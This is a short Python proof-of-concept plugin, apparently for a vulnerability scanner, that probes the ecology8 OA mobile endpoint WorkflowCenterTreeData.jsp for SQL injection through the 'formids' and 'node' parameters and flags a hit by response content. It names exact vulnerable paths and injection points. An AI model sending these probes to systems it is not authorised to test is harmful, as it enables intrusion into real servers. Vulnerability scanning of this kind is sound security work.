#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'ecology8 mobile sql inject'
        self.keyword = ['ecology8', 'sql inject']
        self.info = 'ecology8 mobile sql inject'
        self.type = VUL_TYPE.SQL
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            path_list = list(set([
                self.url_normpath(self.base_url, '/'),
                self.url_normpath(self.url, './'),
            ]))
            pocs  = ["mobile/plugin/browser/WorkflowCenterTreeData.jsp?scope=1&node=root_1&formids=1/1&initvalue=1", # 注入点为formids,分母
                     "mobile/plugin/browser/WorkflowCenterTreeData.jsp?scope=1&node=wftype_6/1&formids=1&initvalue=1"] # 注入点为node,分母
            async with ClientSession() as session:
                for path in path_list:
                    for poc in pocs :
                        url = path + poc

                        async with session.get(url=url) as res:
                            if res!=None:
                                text = await res.text()
                                if '"draggable":false' in text:
                                    self.flag = 1
                                    self.req.append({"url": url})
                                    self.res.append({"info": url, "key": "ecology8 inject"})
                                    return